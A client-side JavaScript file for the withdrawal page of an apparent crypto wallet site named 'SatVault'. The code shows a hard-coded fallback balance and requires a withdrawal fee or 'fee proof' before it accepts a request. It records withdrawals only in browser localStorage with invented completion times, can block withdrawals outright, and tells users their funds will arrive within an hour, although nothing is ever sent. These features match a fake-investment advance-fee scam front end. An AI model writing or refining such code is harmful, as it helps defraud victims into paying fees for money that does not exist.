(function () {
  if (typeof fillWalletFields === "function") fillWalletFields();

  if (typeof isWithdrawalsBlocked === "function" && isWithdrawalsBlocked()) {
    var withdrawForm = document.getElementById("withdraw-form");
    if (withdrawForm) withdrawForm.classList.add("hidden");
  }

  function getProfile() {
    return window.SatVaultAuth && SatVaultAuth.getActiveProfile
      ? SatVaultAuth.getActiveProfile()
      : null;
  }

  function formatAvailable(usd) {
    var profile = getProfile();
    if (profile && profile.currency === "USDT") {
      return Number(usd).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " USDT";
    }
    return "$" + Number(usd).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  function refreshWithdrawAvailable() {
    var available = typeof getAvailableBalance === "function"
      ? getAvailableBalance()
      : (SITE.balanceUsd || 15500);
    var el = document.getElementById("withdraw-available");
    var input = document.getElementById("withdraw-amount");
    if (el) el.textContent = formatAvailable(available);
    if (input) input.max = Math.max(100, Math.floor(available));
  }

  function showWithdrawError(message) {
    var err = document.getElementById("withdraw-error");
    var ok = document.getElementById("withdraw-success");
    if (ok) ok.classList.add("hidden");
    err.textContent = message;
    err.classList.remove("hidden");
  }

  function validateWithdrawAmount(amount) {
    var available = typeof getAvailableBalance === "function"
      ? getAvailableBalance()
      : (SITE.balanceUsd || 15500);

    if (!amount || Number.isNaN(amount)) {
      showWithdrawError("Enter a valid withdrawal amount.");
      return false;
    }
    if (amount < 100) {
      showWithdrawError("Minimum withdrawal is $100.");
      return false;
    }
    if (amount > available) {
      showWithdrawError("Insufficient balance. Available: " + formatAvailable(available));
      return false;
    }
    return true;
  }

  function queueWithdrawal(amount) {
    var profile = getProfile();
    var withinMs = (profile && profile.withdrawCompleteWithinMs) || (60 * 60 * 1000);
    var completesAt = Date.now() + Math.max(5 * 60 * 1000, Math.floor(withinMs * (0.5 + Math.random() * 0.5)));
    var txs = typeof getTransactions === "function" ? getTransactions() : [];
    var amountLabel = (profile && profile.currency === "USDT")
      ? ("-" + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " USDT")
      : ("-$" + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));

    txs.unshift({
      date: new Date().toLocaleDateString(),
      createdAt: Date.now(),
      completesAt: completesAt,
      amountUsd: amount,
      type: "Withdrawal",
      asset: (profile && profile.asset) || "BTC",
      amount: amountLabel,
      status: "Pending",
      feeProofSubmitted: true
    });

    if (typeof saveTransactions === "function") saveTransactions(txs);
    else {
      var write = window.__runSecureWrite || function (fn) { fn(); };
      write(function () {
        localStorage.setItem("transactions", JSON.stringify(txs));
      });
    }

    refreshWithdrawAvailable();
    var ok = document.getElementById("withdraw-success");
    var err = document.getElementById("withdraw-error");
    if (err) err.classList.add("hidden");
    ok.textContent = "Fee proof received. Your withdrawal is Pending and will reflect in your wallet within 1 hour.";
    ok.classList.remove("hidden");
    var form = document.getElementById("withdraw-form");
    if (form) form.reset();
    setTimeout(function () { location.href = "/dashboard/accounthistory.html"; }, 2200);
  }

  refreshWithdrawAvailable();
  document.addEventListener("transactionsUpdated", refreshWithdrawAvailable);

  var form = document.getElementById("withdraw-form");
  if (!form) return;

  form.addEventListener("submit", function (e) {
    e.preventDefault();
    if (typeof isWithdrawalsBlocked === "function" && isWithdrawalsBlocked()) {
      if (typeof showWithdrawBlockedModal === "function") showWithdrawBlockedModal();
      return;
    }

    var err = document.getElementById("withdraw-error");
    var ok = document.getElementById("withdraw-success");
    err.classList.add("hidden");
    ok.classList.add("hidden");

    var amount = Number(document.getElementById("withdraw-amount").value);
    if (!validateWithdrawAmount(amount)) return;

    if (typeof requiresWithdrawFeeProof === "function" && requiresWithdrawFeeProof()) {
      showWithdrawFeeProofModal(amount, function () {
        if (!validateWithdrawAmount(amount)) return;
        queueWithdrawal(amount);
      });
      return;
    }

    WalletModal.showWithdrawFee(amount, function () {
      if (!validateWithdrawAmount(amount)) return;
      queueWithdrawal(amount);
    });
  });
})();
